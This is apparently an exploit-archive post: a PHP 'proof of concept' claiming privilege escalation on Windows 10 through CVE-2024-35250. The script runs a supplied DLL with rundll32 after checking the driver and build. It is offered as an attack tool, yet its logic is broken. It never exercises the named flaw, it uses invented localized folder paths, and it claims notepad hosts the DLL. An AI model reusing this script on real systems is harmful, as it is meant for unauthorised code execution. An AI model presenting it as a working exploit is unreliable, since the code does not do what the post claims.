@@ -1,0 +1,126 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows 10 Famille 10.0.19045.5487 (rundll32) Privilege Escalation                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://www.Microsoft.com                                                                                                   |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: This code is written in PHP and aims to exploit a Local vulnerability in Windows if the system is infected, with support for all different languages, ensuring the correct path to use the payload is specified.
+                      
+					  Exploiting CVE-2024-35250 vulnerability in Windows with support for all languages ​​and running payload via rundll32
+
+    (Related : https://packetstorm.news/files/id/182984/ Related CVE numbers: 	CVE-2024-35250) .
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+
+<?php
+/**
+ * استغلال ثغرة CVE-2024-35250 في Windows مع دعم جميع اللغات
+ */
+
+function getWindowsLCID() {
+    $output = shell_exec('wmic os get locale /value');
+    preg_match('/Locale=(\w+)/', $output, $matches);
+    return isset($matches[1]) ? hexdec($matches[1]) : 1033; // الافتراضي: الإنجليزية
+}
+
+function localeToLanguage($locale) {
+    $languages = [
+        1033 => ['English', 'C:\\Users\\Public\\'], // en-US
+        1036 => ['French', 'C:\\Utilisateurs\\Public\\'], // fr-FR
+        3082 => ['Spanish', 'C:\\Usuarios\\Public\\'], // es-ES
+        1046 => ['Portuguese', 'C:\\Usuários\\Public\\'], // pt-BR
+        1031 => ['German', 'C:\\Benutzer\\Öffentlich\\'], // de-DE
+        1049 => ['Russian', 'C:\\Пользователи\\Общие\\'], // ru-RU
+        1056 => ['Persian', 'C:\\کاربران\\عمومی\\'], // fa-IR
+        1025 => ['Arabic', 'C:\\المستخدمون\\عام\\'], // ar-SA
+        1101 => ['Hindi', 'C:\\Users\\Public\\'], // hi-IN (نفس الإنجليزية)
+        1114 => ['Aramaic', 'C:\\משתמשים\\ציבורי\\'], // الآرامية
+        1037 => ['Hebrew', 'C:\\משתמשים\\ציבורי\\'], // he-IL
+        2052 => ['Chinese (Simplified)', 'C:\\用户\\公共\\'], // zh-CN
+        1028 => ['Chinese (Traditional)', 'C:\\使用者\\公用\\'], // zh-TW
+        1041 => ['Japanese', 'C:\\ユーザー\\パブリック\\'], // ja-JP
+        1042 => ['Korean', 'C:\\사용자\\공용\\'], // ko-KR
+        1054 => ['Thai', 'C:\\ผู้ใช้\\สาธารณะ\\'], // th-TH
+        1066 => ['Vietnamese', 'C:\\Người dùng\\Công cộng\\'], // vi-VN
+    ];
+
+    return $languages[$locale] ?? ['Unknown', 'C:\\Users\\Public\\']; // الافتراضي: الإنجليزية
+}
+
+function getPublicPath() {
+    $locale = getWindowsLCID();
+    list($lang, $path) = localeToLanguage($locale);
+    echo "[+] لغة النظام: $lang (LCID: $locale)\n";
+    return $path;
+}
+
+function is64BitWindows() {
+    return (PHP_INT_SIZE === 8);
+}
+
+function checkVulnerableDriver() {
+    $winDir = getenv('WINDIR');
+    $driverPath = $winDir . '\\system32\\drivers\\ks.sys';
+
+    if (!file_exists($driverPath)) {
+        die("[X] لم يتم العثور على ks.sys، النظام غير قابل للاستغلال.\n");
+    }
+
+    echo "[+] ks.sys موجود في المسار: $driverPath\n";
+    return true;
+}
+
+function getWindowsBuildNumber() {
+    $output = shell_exec('wmic os get BuildNumber /value');
+    preg_match('/BuildNumber=(\d+)/', $output, $matches);
+    return $matches[1] ?? null;
+}
+
+function isVulnerableVersion($buildNumber) {
+    $vulnerableBuilds = range(14393, 19045); // من Windows 10 1607 إلى Windows 10 22H2
+    return in_array($buildNumber, $vulnerableBuilds);
+}
+
+function exploit() {
+    if (!is64BitWindows()) {
+        die("[X] النظام ليس 64 بت، الاستغلال غير ممكن.\n");
+    }
+
+    if (!checkVulnerableDriver()) {
+        die("[X] لا يمكن متابعة الاستغلال.\n");
+    }
+
+    $buildNumber = getWindowsBuildNumber();
+    if (!$buildNumber || !isVulnerableVersion($buildNumber)) {
+        die("[X] إصدار Windows غير مدعوم: $buildNumber\n");
+    }
+
+    echo "[+] تم التحقق من الثغرة، سيتم تنفيذ الهجوم الآن...\n";
+
+    $publicPath = getPublicPath();
+    $payloadPath = $publicPath . "exploit_payload.dll";
+
+    echo "[+] سيتم استخدام المسار: $payloadPath\n";
+
+    $notepad = shell_exec('start /B notepad.exe'); // تشغيل notepad لاستضافة الـ DLL
+    sleep(1);
+
+    echo "[+] تم تشغيل Notepad، تنفيذ الحمولة...\n";
+    shell_exec("rundll32 $payloadPath,Inject"); // تحميل الحمولة عبر rundll32
+}
+
+exploit();
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
